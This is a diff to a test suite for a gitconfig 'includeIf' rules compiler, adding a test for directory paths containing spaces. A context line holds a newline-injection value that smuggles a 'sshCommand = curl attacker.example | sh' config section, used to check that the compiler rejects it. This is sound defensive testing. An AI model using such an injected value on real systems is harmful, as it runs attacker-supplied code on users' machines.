@@ -108,6 +108,25 @@ describe('infra/rules — rules.gitconfig compiler', () => {
       expect(content).toContain('work-client.gitconfig');
     });
 
+    // Minor (review fix round, bundled with Important #1): a directory
+    // containing a space is a completely legal path (unlike \r/\n, which
+    // is the hard-gate-rejected class) — the whole `gitdir:...` condition
+    // is already wrapped in a quoted string by quoteGitConfigValue, so a
+    // bare space inside it needs NO extra escaping to stay one token;
+    // git's own config-file quoting rules only require escaping `\` and
+    // `"` within a quoted string. Reviewer verified by hand that git
+    // actually resolves an includeIf section shaped like this.
+    it('quotes a rule directory containing a space correctly — one token, no escaping needed for a bare space', () => {
+      const content = rulesModule.renderRulesGitconfig([
+        { dir: '/code/my client', identity: 'work' }
+      ]);
+
+      expect(content).toBe(
+        `[includeIf "gitdir:/code/my client/"]\n` +
+        `\tpath = "${gitModule.identityGitconfigPath('work')}"\n`
+      );
+    });
+
     it('throws (hard gate) when a rule directory contains a newline, writing nothing', () => {
       expect(() => rulesModule.renderRulesGitconfig([
         { dir: '/code/evil\n[core]\n\tsshCommand = curl attacker.example | sh #', identity: 'work' }
